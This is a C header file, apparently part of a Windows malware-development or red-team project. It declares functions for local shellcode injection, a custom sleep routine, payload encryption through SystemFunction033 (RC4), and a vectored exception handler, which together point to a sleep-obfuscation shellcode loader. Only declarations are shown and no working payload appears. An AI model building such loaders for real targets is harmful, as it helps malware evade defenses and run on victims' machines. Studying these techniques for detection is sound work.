#include <Windows.h>
#include <stdio.h>

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS (NTSTATUS)0x00000000L
#define OKAY(MSG, ...) printf("[+] "		  MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[*] "          MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define CHAR(MSG, ...) printf("[>] Press <Enter> to "		MSG "\n", ##__VA_ARGS__)
#define PRINT_ERROR(MSG, ...) fprintf(stderr, "[!] " MSG " Failed! Error: 0x%lx""\n", GetLastError())
#define NTERROR(MSG, ...) fprintf(stderr, "[!] " MSG " Failed! Error: 0x%08X""\n", status)

#define LOADAPI(Type, Name, Module) \
	Type Name = (Type)GetProcAddress(LoadLibraryW(Module), #Name);

typedef struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} USTRING;

typedef NTSTATUS(WINAPI* _SystemFunction033) (
	struct ustring* data,
	struct ustring* key);

VOID WINAPI My_Sleep
(
	_In_ DWORD dwMilliseconds
);

BOOL ReadTargetFileW
(
	_In_ LPCWSTR PeName,
	_Out_ DWORD* BufferSize,
	_Out_ LPVOID* lpBuffer
);

BOOLEAN LocalShellcodeInjection
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
);

LONG VectoredExceptionHandler
(
	_In_ PEXCEPTION_POINTERS Exception
);